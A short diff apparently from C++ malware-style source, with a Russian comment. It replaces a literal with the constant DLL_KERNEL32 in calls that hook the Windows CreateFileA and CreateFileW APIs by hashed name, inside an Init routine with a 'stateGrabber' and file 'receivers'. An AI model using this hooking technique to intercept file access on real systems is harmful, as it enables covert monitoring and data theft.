@@ -386,12 +386,12 @@ bool Init( int flags )
 	List::SetFreeItemMehod( receivers, DelReceiver ); //для автоматического удаления получателей
 	if( flags & CREATEFILEA )
 	{
-		if (!HookApi(1, Hash_CreateFileA, &Hook_CreateFileA, &Real_CreateFileA ) )
+		if (!HookApi(DLL_KERNEL32, Hash_CreateFileA, &Hook_CreateFileA, &Real_CreateFileA ) )
 			return false;
 	}
 	if( flags & CREATEFILEW )
 	{
-		if (!HookApi(1, Hash_CreateFileW, &Hook_CreateFileW, &Real_CreateFileW ) )
+		if (!HookApi(DLL_KERNEL32, Hash_CreateFileW, &Hook_CreateFileW, &Real_CreateFileW ) )
 			return false;
 	}
 	stateGrabber = 0;
